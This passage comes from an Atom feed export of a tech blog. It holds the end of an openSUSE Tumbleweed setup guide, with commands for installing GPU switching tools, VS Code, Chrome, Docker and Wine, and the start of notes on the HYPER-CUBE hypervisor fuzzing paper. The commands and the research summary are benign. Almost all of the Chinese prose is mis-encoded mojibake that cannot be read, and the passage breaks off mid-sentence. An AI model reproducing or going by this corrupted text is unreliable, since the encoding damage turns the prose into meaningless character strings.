-c 80<br></code></pre></td></tr></table></figure><p>ç„¶åå®‰è£… <code>supergfxctl</code> ç”¨ä»¥ç®¡ç†æ˜¾å¡ï¼Œå¹¶æ›¿æ¢æ‰è¿‡æ—¶çš„ <code>suse-prime</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper rm suse-prime<br>sudo zypper in supergfxctl<br>sudo systemctl enable --now supergfxd<br></code></pre></td></tr></table></figure><p>ä¾‹å¦‚å¤–å‡ºæ—¶å¯ä»¥ç”¨ <code>supergfxctl</code> åˆ‡æ¢åˆ°é›†æ˜¾è¾“å‡ºä»¥çœç”µï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo supergfxctl -s # æŸ¥çœ‹ç¬”è®°æœ¬æ”¯æŒçš„è§†é¢‘è¾“å‡ºæ¨¡å¼<br>sudo supergfxctl -g # æŸ¥çœ‹å½“å‰çš„è§†é¢‘è¾“å‡ºæ¨¡å¼<br>sudo supergfxctl -m Integrated # è®¾ç½®ä¸ºé›†æ˜¾è¾“å‡º<br>sudo supergfxctl -m Hybrid # è®¾ç½®ä¸ºæ··åˆè¾“å‡º<br></code></pre></td></tr></table></figure><blockquote><p>ç¤¾åŒºå…¶å®è¿˜æä¾›äº†ä¸€ä¸ªå›¾å½¢åŒ–é…ç½®ç•Œé¢ <code>asusctl-rog-gui</code>ï¼Œä½†æ˜¯ç¬”è€…ç”µè„‘ä¸Šä¸èƒ½æˆåŠŸå¯åŠ¨ï¼Œä¸è¿‡å…¶å®åŠŸèƒ½éƒ½æ˜¯ä¸€æ ·çš„ï¼šï¼‰</p></blockquote><h1 id="0x06-å¸¸ç”¨çš„ä¸€äº›è½¯ä»¶å®‰è£…"><a href="#0x06-å¸¸ç”¨çš„ä¸€äº›è½¯ä»¶å®‰è£…" class="headerlink" title="0x06. å¸¸ç”¨çš„ä¸€äº›è½¯ä»¶å®‰è£…"></a>0x06. å¸¸ç”¨çš„ä¸€äº›è½¯ä»¶å®‰è£…</h1><p>æ¯”å¦‚è¯´å¤§å®¶éƒ½å–œæ¬¢çš„ä»£ç ç¼–è¾‘å™¨ <code>vscode</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc<br>sudo zypper addrepo https://packages.microsoft.com/yumrepos/vscode vscode<br>sudo zypper refresh<br>sudo zypper install code<br></code></pre></td></tr></table></figure><p>Chrome æµè§ˆå™¨çš„å®‰è£…éœ€è¦å€ŸåŠ© <a href="https://en.opensuse.org/SDB:OBS_Package_Installer">OPI</a>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in opi<br>sudo opi chrome<br></code></pre></td></tr></table></figure><p>Docker çš„å®‰è£…ç›´æ¥æŒ‰ç…§ <a href="https://en.opensuse.org/Docker">wiki</a> å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install docker docker-compose docker-compose-switch<br>sudo systemctl enable docker<br>sudo usermod -G docker -a $USER # å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ° docker,åé¢å°±ä¸ç”¨æ€»æ˜¯ sudo docker äº†<br>sudo reboot # é‡å¯å°±å®Œäº‹äº†<br></code></pre></td></tr></table></figure><p>OpenSUSE æ˜¯ RPM ç³»ï¼Œå› æ­¤å¤§éƒ¨åˆ†è½¯ä»¶å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥å°† rpm åŒ…ä¸‹è½½ä¸‹æ¥ç”¨ zypper å®‰è£…å³å¯ï¼Œä»¥<a href="https://www.feishu.cn/download">é£ä¹¦ Linux ç‰ˆ</a>ä¸ºä¾‹ï¼š</p><p><img src="https://s2.loli.net/2023/11/23/3xMHfgpuzaDsXrQ.png" alt="image.png"></p><p>ç¬”è€…åœ¨æµ·å¤–ï¼Œæœ‰çš„æ—¶å€™ä¼šç”¨åˆ° Discordã€Telegram è¿™æ ·çš„è½¯ä»¶ï¼Œä»–ä»¬éƒ½æ˜¯æœ‰ Linux åŸç”Ÿç‰ˆæœ¬çš„ï¼ˆè¿™é‡Œå°±ä¸å¾—ä¸åæ§½å›½å†…çš„ä¸€äº›è½¯ä»¶è¿Ÿè¿Ÿä¸å‡º Linux ç‰ˆäº†ï¼‰ï¼Œç›´æ¥ç”¨ zypper å®‰è£…å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in discord telegram-desktop<br></code></pre></td></tr></table></figure><p>ä¸€äº›åªæœ‰ Windows ç‰ˆæœ¬çš„è½¯ä»¶ï¼ˆä¾‹å¦‚å¾®ä¿¡ï¼‰å¯ä»¥å°è¯•ç”¨ <code>wine</code> æ‰“å¼€ï¼Œä½¿ç”¨ zypper å¯ä»¥ç›´æ¥å®‰è£… <code>wine</code>ï¼Œ<code>winetricks</code> åˆ™æ˜¯ç”¨æ¥è¿›è¡ŒåŠŸèƒ½è¡¥å……çš„å°å·¥å…·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in wine winetricks<br></code></pre></td></tr></table></figure><h1 id="0x07-ä¸ªäººé…ç½®ä¼˜åŒ–"><a href="#0x07-ä¸ªäººé…ç½®ä¼˜åŒ–" class="headerlink" title="0x07. ä¸ªäººé…ç½®ä¼˜åŒ–"></a>0x07. ä¸ªäººé…ç½®ä¼˜åŒ–</h1><h3 id="å•å‡»é€‰ä¸­è€Œéæ‰“å¼€"><a href="#å•å‡»é€‰ä¸­è€Œéæ‰“å¼€" class="headerlink" title="å•å‡»é€‰ä¸­è€Œéæ‰“å¼€"></a>å•å‡»é€‰ä¸­è€Œéæ‰“å¼€</h3><p>KDE Dolphin ç»å…¸é…ç½®äº†ï¼Œä¸è¿‡ç¬”è€…æ›´ä¹ æƒ¯ Windows é‚£æ ·çš„å•å‡»é€‰æ‹©åŒå‡»æ‰“å¼€çš„æ¨¡å¼ï¼Œè¿™é‡Œåªéœ€è¦åœ¨ç³»ç»Ÿè®¾ç½®ä¸­çš„ <code>Workspace Behaviour-&gt;General Behaviour</code> ä¸­å‹¾é€‰ <code>Selects them</code> å³å¯</p><!--0x08. ä½¿ç”¨ Docker æ­å»ºæ·±åº¦å­¦ä¹ ç¯å¢ƒ å¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¸Œæœ›ä¿è¯è®¡ç®—æœºä¸»ç¯å¢ƒçš„æ•´æ´ä¸å®Œæ•´æ€§ï¼Œæ¯•ç«Ÿä¸‡ä¸€æŸä¸€å¤©é…å„ç§è½¯ä»¶æŠŠä¾èµ–ç»™æå´©äº†å°±æ¯”è¾ƒå°´å°¬äº†ï¼Œå› æ­¤å¾ˆå¤šä»»åŠ¡æˆ‘ä»¬å…¶å®å¯ä»¥ç›´æ¥é€šè¿‡ Docker æ¥å®Œæˆï¼Œè™½ç„¶ OpenSUSE è‡ªå·±ä¹Ÿæœ‰æ·±åº¦å­¦ä¹ æ¡†æ¶ï¼Œä½†æ˜¯çœŸç”¨ OpenSUSE æ¥ææ·±åº¦å­¦ä¹ çš„ç»ˆç©¶æ˜¯å°‘æ•°ï¼ˆå›½äººå°±æ›´å°‘äº†ï¼‰ï¼Œç›¸å¯¹åº”åœ°åœ¨ç½‘ä¸Šçš„èµ„æ–™ä¹Ÿæ¯”è¾ƒå°‘ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œé€‰æ‹©ä½¿ç”¨ Ubuntu é•œåƒæ¥æ­å»ºå®¹å™¨ç¯å¢ƒï¼Œæ¯•ç«Ÿææœºå™¨å­¦ä¹ çš„æœ€é‡è¦çš„**å°±æ˜¯é‚£å¼ å¡**ï¼Œè€Œä¸æ˜¯å„ç§å¥‡æ€ªçš„ç³»ç»Ÿç¯å¢ƒ-->]]></content>
    
    
    <summary type="html">&lt;p&gt;ä½ è¯´ğŸ‰å¯¹ï¼Œä½†æ˜¯ Arch Linux æ˜¯ç”± Arch ç¤¾åŒºå¼€å‘çš„ä¸€ä¸ª Linux å‘è¡Œç‰ˆâ€¦&lt;/p&gt;</summary>
    
    
    
    <category term="DISTRO" scheme="https://arttnba3.github.io/categories/DISTRO/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="OpenSUSE" scheme="https://arttnba3.github.io/tags/OpenSUSE/"/>
    
    <category term="OpenSUSE Tumbleweed" scheme="https://arttnba3.github.io/tags/OpenSUSE-Tumbleweed/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x04ã€‘è®ºæ–‡ç¬”è®°ï¼šHYPER-CUBE: High-Dimensional Hypervisor Fuzzing</title>
    <link href="https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/"/>
    <id>https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/</id>
    <published>2023-10-27T11:30:54.000Z</published>
    <updated>2023-10-27T11:37:34.977Z</updated>
    
    <content type="html"><![CDATA[<p>hyper çš„ ä¸æ˜¯ visorï¼Œæ˜¯æˆ‘ cube å“’ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬”è€…æœ€è¿‘åˆšå¥½åœ¨å¼„è™šæ‹ŸåŒ–ç›¸å…³çš„å·¥ä½œï¼ˆ<del>æœ¬æ¥ä»¥ä¸ºä»å­—èŠ‚ç¦»èŒåå°±ä¸ä¼šç¢°åˆ°å’Œè™šæ‹ŸåŒ–ç›¸å…³çš„å¼€å‘äº†</del>ï¼‰ï¼Œè€Œåˆšå¥½ç¬”è€…çœ‹åˆ°æœ‰ä¸€ç³»åˆ—è®ºæ–‡ï¼ˆè¿˜å¾—æ˜¯è®ºæ–‡ä½œè€…ğŸ‘ï¼‰ç»™å‡ºäº†åˆ©ç”¨ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯æ¥è¾…åŠ©æ¼æ´æŒ–æ˜ä»¥åŠé’ˆå¯¹è™šæ‹ŸåŒ–ç³»ç»Ÿè¿›è¡Œæ¼æ´æŒ–æ˜çš„å¥½ä¸œè¥¿ï¼Œå› æ­¤ç¬”è€…è¿˜æ˜¯æ‰“ç®—æŠ½ç©ºæµ…è¯»ä¸€ä¸‹ï¼šï¼‰</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>è™šæ‹Ÿæœºç®¡ç†å™¨ï¼ˆVirtual Machine Managerï¼ŒVMMï¼Œaka Hypervisorï¼‰æ˜¯äº‘æŠ€æœ¯ï¼ˆå°¤å…¶æ˜¯ IaaSï¼‰çš„åŸºçŸ³ï¼Œå› æ­¤å…¶å®‰å…¨é—®é¢˜ååˆ†é‡è¦</p><p>æœ¬æ–‡ç»™å‡º <code>Hyper-Cube</code> â€”â€”ä¸€ä¸ªé€šç”¨çš„å¯¹ hypervisor è¿›è¡Œ fuzzing çš„å·¥å…·</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>æ²¡å¿…è¦è®²ä½†è¿˜æ˜¯ç®€å•æ‰¯å‡ å¥</del></p></blockquote><p>ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯äº‘è®¡ç®—çš„åŸºçŸ³ï¼Œä½† VMM è‹¥æœ‰æ¼æ´åˆ™ä¼šå½±å“åˆ°å…¶ä»– VM ä»¥åŠæœåŠ¡æä¾›å•†çš„å®‰å…¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§é«˜æ•ˆçš„æ‰‹æ®µæ‰¾å‡º VMM ä¸­çš„æ¼æ´</p><p>æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„æ‰¾æ¼æ´æ‰‹æ®µï¼Œä½†ç°åœ¨æˆ‘ä»¬å¾ˆéš¾é«˜æ•ˆåœ° fuzz VMMï¼š</p><ul><li>ä¸åŒäºä¼ ç»Ÿ fuzzï¼ˆåªæœ‰ stdin å’Œ syscall ä½œä¸ºè¾“å…¥ï¼‰ï¼Œfuzz VMM éœ€è¦ä¸å¤šç§ç±»å‹çš„æ¥å£ ï¼ˆMMIOã€PIOã€hypercallã€â€¦ï¼‰è¿›è¡Œäº¤äº’</li><li>VMM crash åçš„é‡å¯å¼€é”€è¾ƒå¤§</li><li>å¾ˆéš¾é«˜æ•ˆåœ° fuzzï¼ˆä¾‹å¦‚ä¸èƒ½å¤šçº¿ç¨‹ï¼‰</li></ul><p>è®ºæ–‡å†™ä½œæ—¶ï¼ˆç¬”è€…æ³¨ï¼š2020å¹´ï¼‰æœ€å…ˆè¿›çš„ hypervisor fuzzer æ˜¯ç”± AFL æ”¹æ¥çš„ <a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">VDF</a>ï¼Œåªèƒ½ fuzz MMIO&#x2F;PIOï¼›å¦ä¸€ä¸ª hypervisor fuzzer <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">IOFUZZ</a> åˆ™åªèƒ½å¾€éšæœºç«¯å£å†™éšæœºå€¼ï¼Œ<del>éƒ½å¼±çˆ†äº†</del></p><p>ä¸ºäº†è§£å†³è¿™äº›æŒ‘æˆ˜ï¼Œæœ¬æ–‡ç»™å‡ºä¸‰ä¸ªå¯ä»¥æå‡çš„ç›®æ ‡ï¼š</p><ul><li>è¾ƒé«˜çš„æµ‹è¯•ç”¨ä¾‹ååé‡</li><li>èƒ½åŒæ—¶ä¸æ‰€æœ‰å¯ç”¨æ¥å£è¿›è¡Œäº¤äº’</li><li>èƒ½ä¸ºä¸€ç»„ä¸åŒçš„ hypervisor ç”Ÿæˆç¨³å®šï¼ˆstableï¼‰ä¸ç¡®å®šï¼ˆdeterministicï¼‰çš„æµ‹è¯•ç”¨ä¾‹</li></ul><p>åŸºäºæ­¤ï¼Œä½œè€…è®¾è®¡å‡ºäº† <code>HYPER-CUBE</code>ï¼šä¸€ä¸ªåŸºäºä¸€ä¸ªæœ€å°å®¢åˆ¶åŒ–æ“ä½œç³»ç»Ÿçš„é€šç”¨ hypervisor fuzzerï¼Œæ€»ç»“ä¸‹æ¥è´¡çŒ®æœ‰å¦‚ä¸‹ä¸‰ç‚¹ï¼š</p><ul><li>ä½œè€…è®¾è®¡äº†ä¸€ä¸ªå¤šç»´åº¦çš„ï¼ˆmulti-dimentionalï¼‰ã€æ— å¹³å°ä¾èµ–çš„ï¼ˆplatform-independentï¼‰èƒ½å¤Ÿæœ‰æ•ˆä¸”é«˜æ•ˆæµ‹è¯•ä¸åŒæ¥å£çš„æ¨¡ç³Šæµ‹è¯•æ–¹æ³•</li><li>ä½œè€…æè¿°äº†ä¸€ä¸ªèƒ½å¤Ÿé«˜æ•ˆ fuzz hypervisor çš„ç‹¬ç«‹äºå¾…æµ‹å¹³å°çš„æ–¹æ³•</li><li>ä½œè€…é€šè¿‡ä¸€ä¸ªåä¸º <code>HYPER-CUBE</code> çš„å®¢åˆ¶æ“ä½œç³»ç»Ÿå®ç°äº†è¿™ç§æ–¹æ³•ï¼Œå¹¶èƒ½åœ¨çœŸå®ä¸–ç•Œçš„ hypervisor ä¸­æ‰¾å‡ºæ¼æ´</li></ul><p>é¡¹ç›®ä»£ç å¼€æºäº <a href="">https://github.com/RUB-SysSec/hypercube</a></p><h1 id="0x02-Technology-Background"><a href="#0x02-Technology-Background" class="headerlink" title="0x02. Technology Background"></a>0x02. Technology Background</h1><blockquote><p><del>æ„Ÿè§‰ä¸å¦‚ç›´æ¥çœ‹<a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">ç³»ç»Ÿè™šæ‹ŸåŒ–å¯¼è®º</a></del></p></blockquote><p>åœ¨å¼€å§‹ä¹‹å‰å…ˆä»‹ç» X86 è™šæ‹ŸåŒ–çš„ä¸€äº›åŸºç¡€çŸ¥è¯†ã€X86 ä¸­ OS çš„å¯åŠ¨è¿‡ç¨‹ã€Guest OS ä¸ hypervisor çš„é€šä¿¡æ¥å£</p><h2 id="A-x86-Boot-Process"><a href="#A-x86-Boot-Process" class="headerlink" title="A. x86 Boot Process"></a>A. x86 Boot Process</h2><p>åœ¨ x86 æœºå™¨ä¸Šæœ€å…ˆè¿è¡Œçš„ç¨‹åºé€šå¸¸æ˜¯ <code>Basic Input/Output System</code> ï¼ˆBIOSï¼‰ æˆ– <code>Unified Extensible Firmware Interface</code> ï¼ˆUEFIï¼‰ï¼Œæœ¬æ–‡å°†è¿™æ ·çš„ç¨‹åºç§°ä¸º <code>å›ºä»¶</code> ï¼ˆfirmwareï¼‰ï¼Œä¹‹åä¾¿æ˜¯è¿è¡Œ boot loader ï¼ˆå¦‚ GRUBï¼‰æ¥å‡†å¤‡ç¯å¢ƒå¹¶å¼•å¯¼æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œå†ç”±å†…æ ¸æ¥é…ç½®å…¶ä»–ç¡¬ä»¶ï¼ˆå¦‚ä¸­æ–­æ§åˆ¶å™¨ã€PCI è®¾å¤‡ï¼‰</p><h2 id="B-Input-x2F-Output-on-x86"><a href="#B-Input-x2F-Output-on-x86" class="headerlink" title="B. Input&#x2F;Output on x86"></a>B. Input&#x2F;Output on x86</h2><p>x86 ä¸Šä¸è®¾å¤‡é€šä¿¡çš„æ–¹å¼æœ‰ï¼š</p><ul><li><code>Port I/O</code>ï¼šä¼ ç»Ÿçš„ç«¯å£åœ°å€æ€»çº¿ï¼Œé€šè¿‡ <code>in</code>ã€<code>out</code> æŒ‡ä»¤è®¿é—®</li><li><code>Memory-Mapped I/O</code>ï¼šå¤–è®¾å¯„å­˜å™¨&#x2F;å†…å­˜è¢«æ˜ å°„åˆ°ç‰©ç†åœ°å€æ€»çº¿ä¸Šï¼Œä»è€Œå¯ä»¥é€šè¿‡ä¼ ç»Ÿå†…å­˜è®¿é—®æ–¹å¼è¿›è¡Œè®¿é—®</li><li><code>Direct Memory Access</code>ï¼šè¿™ç§æœºåˆ¶å…è®¸å¤–è®¾ç›´æ¥è®¿é—®ç‰©ç†å†…å­˜ï¼Œæœ¬æ–‡ä¸»è¦å…³æ³¨ PCI&#x2F;PCIe DMAï¼Œè€Œé ISA DMAï¼ˆå› ä¸ºéš¾æï¼‰</li></ul><p>è¡¨ 1 ç»™å‡ºæ¥å£æ€»è§ˆï¼š</p><p><img src="https://s2.loli.net/2023/10/21/1h6xUYOkTNiBVgl.png" alt="TABLE I: Overview of hypervisor attack surfaces."></p><h2 id="C-Hypervisor"><a href="#C-Hypervisor" class="headerlink" title="C. Hypervisor"></a>C. Hypervisor</h2><p>Hypervisor ä¸º VM æä¾›å¯æ§çš„è™šæ‹Ÿç¯å¢ƒï¼ˆè™šæ‹Ÿ CPUã€è™šæ‹Ÿå†…å­˜ã€æ¨¡æ‹Ÿä¸­æ–­ï¼‰ï¼Œå½“ VM éœ€è¦è¿›è¡Œç‰¹æƒæ“ä½œæ—¶ä¾¿ä¼šè§¦å‘ <code>VM-Exit</code> å°†æ§åˆ¶æƒè¿”è¿˜ç»™ hypervisorï¼Œç”±å…¶å®Œæˆæ¨¡æ‹Ÿæ“ä½œåè¿”è¿˜æ§åˆ¶æƒâ€”â€”ç§°ä¸º <code>Trap and Emulate</code> æœºåˆ¶</p><p>é€šè¿‡æä¾›å®Œå…¨è™šæ‹ŸåŒ–çš„ç¯å¢ƒï¼Œhypervisor å¯ä»¥åœ¨ç‰©ç†æœºä¸ŠåŒæ—¶è¿è¡Œå¤šä¸ª VM</p><h3 id="1-CPU-and-Memory-Virtualization"><a href="#1-CPU-and-Memory-Virtualization" class="headerlink" title="1) CPU and Memory Virtualization"></a>1) CPU and Memory Virtualization</h3><p>è¿‡å»äººä»¬ç”¨ <em>äºŒè¿›åˆ¶è½¬è¯‘</em> ï¼ˆbinary translationï¼‰æŠ€æœ¯å®ç°å®Œå…¨çš„ CPU ä¸å†…å­˜è™šæ‹ŸåŒ–ï¼Œé€šè¿‡ <code>trap and emulate</code> æ¨¡å‹æ•è·å½¢å¦‚ <code>mov cr3</code> è¿™æ ·çš„ç‰¹æƒæŒ‡ä»¤ï¼Œä½†æ€§èƒ½å¼€é”€å·¨å¤§ï¼Œäºæ˜¯ Intel å’Œ AMD éƒ½å„è‡ªå¼•å…¥äº†è‡ªå·±çš„ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æ”¯æŒ</p><h3 id="2-Device-Emulation"><a href="#2-Device-Emulation" class="headerlink" title="2) Device Emulation"></a>2) Device Emulation</h3><p>hypervisor è¿˜éœ€è¦æ¨¡æ‹ŸåŒ…æ‹¬ä¸­æ–­æ§åˆ¶å™¨åœ¨å†…çš„æ ‡å‡†ç¡¬ä»¶ï¼Œå…¶ä¸»è¦æœ‰ä¸¤ç§äº¤äº’æœºåˆ¶ï¼šMMIO ä¸ port I&#x2F;Oï¼Œä¸è¿‡ hypervisor ä¸éœ€è¦ä¸­æ–­ DMA å†…å­˜è®¿é—®</p><p>å›¾ 1 ç»™å‡ºä¸€ä¸ªé€šè¿‡ <em>trap and emulate</em> æ¨¡å‹å®ç°è®¾å¤‡è™šæ‹ŸåŒ–çš„ä¾‹å­ï¼ˆQEMU&#x2F;KVMï¼‰ï¼š</p><p><img src="https://s2.loli.net/2023/10/25/OwSxUy159cgsQo7.png" alt="Fig. 1: Device emulation and its trap and emulate handling of privilegedinstructions in KVM and QEMU."></p><h3 id="3-Para-Virtualization"><a href="#3-Para-Virtualization" class="headerlink" title="3) Para-Virtualization"></a>3) Para-Virtualization</h3><p>è™šæ‹Ÿæœºå¹¶ä¸éœ€è¦ç›´æ¥æ¥è§¦åˆ°å®é™…çš„ç¡¬ä»¶ï¼Œ<em>åŠè™šæ‹ŸåŒ–</em> ï¼ˆpara-virtualizationï¼‰ç”±æ­¤è¯ç”Ÿï¼Œè¿™ç§æŠ€æœ¯æœ¬è´¨ä¸Šéœ€è¦æˆ‘ä»¬å»ä¿®æ”¹ OSï¼Œä¾‹å¦‚ VirtIO ä¾¿æä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„è™šæ‹Ÿè®¾å¤‡åè®®ï¼ŒOS åªéœ€è¦å®ç°ä¸€å¥—è™šæ‹Ÿè®¾å¤‡é©±åŠ¨å³å¯</p><p>ç°ä»£çš„ç¡¬ä»¶åŠ é€Ÿçš„ï¼ˆhardware-acceleratedï¼‰è™šæ‹ŸåŒ–åˆ™å¼•å…¥äº†æ–°çš„æŒ‡ä»¤å« <code>hypercall</code>ï¼Œç”¨æ¥ä¸»åŠ¨è§¦å‘ <code>VM-exit</code> ä»¥å®ç°ä¸€äº›ä»»åŠ¡ï¼ˆä»¥ Intel ä¸ºä¾‹ä¸º <code>vmcall</code> æŒ‡ä»¤ï¼‰</p><h2 id="D-Fuzzing-Hypervisor"><a href="#D-Fuzzing-Hypervisor" class="headerlink" title="D. Fuzzing Hypervisor"></a>D. Fuzzing Hypervisor</h2><p>å¯¹ hypervisor çš„ fuzzing å­˜åœ¨æ¥å£ç¹å¤šã€é‡å¯å¼€é”€å¤§çš„æŒ‘æˆ˜ï¼Œç›®å‰ç»å¤§éƒ¨åˆ†ç ”ç©¶æ¥è‡ªå·¥ä¸šç•Œï¼Œä¾‹å¦‚ <a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf.">Tang</a> å®ç°äº†ä¸€ä¸ªå®šåˆ¶äº QEMU çš„ SeaBIOS çš„ AFL æ‰©å±•ï¼Œå­¦æœ¯ç•Œåˆ™ä»…æœ‰ä¸€ä¸ª VDF</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="A-Threat-Model"><a href="#A-Threat-Model" class="headerlink" title="A. Threat Model"></a>A. Threat Model</h2><p>æ”»å‡»è€…æœ‰ç€å¯¹è™šæ‹Ÿæœºçš„å®Œå…¨æ§åˆ¶æƒï¼Œå…¶ç›®çš„ä¸ºè·å–å®¿ä¸»æœºä¸Šå…¶ä»–è™šæ‹Ÿæœºæˆ–æ˜¯å®¿ä¸»æœºæœ¬èº«çš„æ§åˆ¶æƒï¼ŒDoS æ”»å‡»ä¹Ÿçº³å…¥è€ƒè™‘ </p><h2 id="B-Challenge-in-Fuzzing-Hypervisors"><a href="#B-Challenge-in-Fuzzing-Hypervisors" class="headerlink" title="B. Challenge in Fuzzing Hypervisors"></a>B. Challenge in Fuzzing Hypervisors</h2><p>å¦‚å›¾ 2 æ‰€ç¤ºï¼Œhypervisor ä¸ guest é—´çš„äº¤äº’æ¥å£ä¼—å¤šï¼Œä¸”éæ‰€æœ‰æ¥å£éƒ½æœ‰æ–‡æ¡£ï¼Œéœ€è¦ fuzzer èƒ½å®ç°ä¸ hypervisor é—´çš„æœ‰æ„ä¹‰äº¤äº’ï¼›VM ä¸­ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ä¹Ÿå¯èƒ½å½±å“æ¼æ´å¯»æ‰¾è¿‡ç¨‹ï¼Œä½†é‡å¯ç³»ç»Ÿè€—æ—¶è¾ƒé•¿ï¼›ç¡¬ä»¶åŠ é€Ÿä¹Ÿå¯èƒ½å¸¦æ¥ä¸ç¡®å®šæ€§</p><p><img src="https://s2.loli.net/2023/10/27/kqSU9gYXdzChcFe.png" alt="Fig. 2: High-level overview of the system architecture of HYPER-CUBE"></p><h2 id="C-Architecture"><a href="#C-Architecture" class="headerlink" title="C. Architecture"></a>C. Architecture</h2><h3 id="1-High-Level-Overview"><a href="#1-High-Level-Overview" class="headerlink" title="1) High-Level Overview"></a>1) High-Level Overview</h3><p>æ–‡ç« ä¸­çš„ fuzzer åŒ…å«å¦‚å›¾ 2 æ‰€ç¤ºçš„ä¸‰ä¸ªä¸»è¦ç»„æˆéƒ¨åˆ†ï¼š</p><ul><li><code>HYPER-CUBE OS</code> åœ¨è™šæ‹Ÿæœºå†…å¯åŠ¨å¹¶æšä¸¾ç¡¬ä»¶æ¥å£ï¼Œå®šåˆ¶çš„ç³»ç»Ÿä½¿å¾—æˆ‘ä»¬å¯¹ VM æœ‰ç€å®Œå…¨çš„æ§åˆ¶æƒé™</li><li>éšåå¯åŠ¨çš„ç”¨æ¥ fuzz hypervisor çš„å­—èŠ‚ç è§£é‡Šå™¨ <code>TESSERACT</code></li><li>ä¸€ç»„é¢å¤–çš„å·¥å…·ï¼Œç”¨äºå‘ <code>TESSERACT</code> æä¾›å­—èŠ‚ç æµã€åç¼–è¯‘æ‰§è¡Œçš„å­—èŠ‚ç ç¨‹åºã€ä½¿ç”¨å¦‚ä¸²å£ç­‰æ¥å£è§‚æµ‹ hypervisor</li></ul><p>è¿™æ ·çš„æ¶æ„å…è®¸æˆ‘ä»¬å®ç°ä¸Šæ–‡æ‰€è¿°çš„ä¸‰ä¸ªç›®æ ‡ï¼š</p><ul><li><code>High Performance Fuzzing</code>ï¼šå®¢åˆ¶æ“ä½œç³»ç»Ÿ <code>HYPER-CUBE OS</code> æ¯” COTSï¼ˆCommercial Off-The-Shelfï¼‰ OS æ›´è½»é‡çº§ï¼Œä»è€Œåœ¨ crash åèƒ½å¿«é€Ÿé‡å¯ç³»ç»Ÿï¼›ç¼–è¯‘æ‰§è¡Œç¨‹åºè¿›è¡Œ fuzz ä¹Ÿè¾ƒè€—æ—¶ï¼Œå› æ­¤ä½œè€…ä½¿ç”¨è‡ªåˆ¶çš„è¿è¡Œåœ¨ VM ä¸­ ring0 çš„ <code>TESSERACT</code> å­—èŠ‚ç è§£é‡Šå™¨ï¼Œä»¥ <em>fuzzer-friendly</em> çš„æ–¹å¼è®¾è®¡å­—èŠ‚ç ï¼šæœ€å¤§åŒ–äº§ç”Ÿæœ‰ç”¨æŒ‡ä»¤çš„å¯èƒ½æ€§ã€å¯¹å†…å­˜åœ°å€ä¸ä½œä¸ºæŒ‡é’ˆè€Œæ˜¯ä½œä¸ºå¤§å°ä¸åç§»å€¼è¿›è¡Œç¼–ç ï¼ˆ<code>TESSERACT</code> ä¼šè®°å½•é‚£äº›æœ‰è¶£çš„å†…å­˜åŒºåŸŸï¼‰ï¼›ä¸ºäº†æé«˜ç”Ÿæˆåˆç†å­—èŠ‚ç çš„æ¦‚ç‡ï¼Œæ‰€æœ‰å‚æ•°éƒ½è¢«æ˜ å°„åˆ°æ¨¡èŒƒå›´ä¸­</li><li><code>Generic High-Dimensional Fuzzing</code>ï¼šç°æœ‰çš„ hypervisor fuzzer é€šå¸¸å…³æ³¨äºæŸä¸€æ¥å£ï¼Œè€Œ 